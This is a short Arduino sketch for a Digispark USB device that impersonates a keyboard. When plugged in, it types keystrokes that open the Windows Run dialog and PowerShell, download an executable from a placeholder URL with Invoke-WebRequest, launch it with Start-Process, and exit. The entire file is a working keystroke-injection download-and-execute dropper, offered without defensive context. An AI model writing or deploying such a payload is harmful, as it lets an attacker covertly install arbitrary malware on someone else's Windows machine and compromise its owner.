#include <DigiKeyboard.h>
#include <DigiKeyboardFr.h>

void setup() {
  // Wait for a few seconds on startup
  delay(5000);

  // Press and hold the Windows key (GUI)
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  // Wait a bit
  delay(100);

  // Release the Windows key (GUI)
  DigiKeyboard.sendKeyPress(0);

  // Wait a bit
  delay(100);

  // Open PowerShell
  DigiKeyboardFr.print("powershell");
  DigiKeyboardFr.sendKeyPress(KEY_ENTER);

  // Wait a bit
  delay(1000);

  // Download the file from a URL
  DigiKeyboardFr.print("Invoke-WebRequest -Uri 'https://example.com/path/to/file.exe' -OutFile 'C:\\local\\path\\file.exe'");
  DigiKeyboardFr.sendKeyPress(KEY_ENTER);

  // Wait a bit
  delay(1000);

  // Execute the downloaded file
  DigiKeyboardFr.print("Start-Process 'C:\\local\\path\\file.exe'");
  DigiKeyboardFr.sendKeyPress(KEY_ENTER);

  // Wait a bit
  delay(1000);

  // Exit PowerShell
  DigiKeyboardFr.print("exit");
  DigiKeyboardFr.sendKeyPress(KEY_ENTER);

  // End the program
  DigiKeyboardFr.sendKeyPress(0);

  // Empty loop to prevent restarts
  while (true) {
    delay(1000);
  }
}

void loop() {
  // Nothing to do here
}
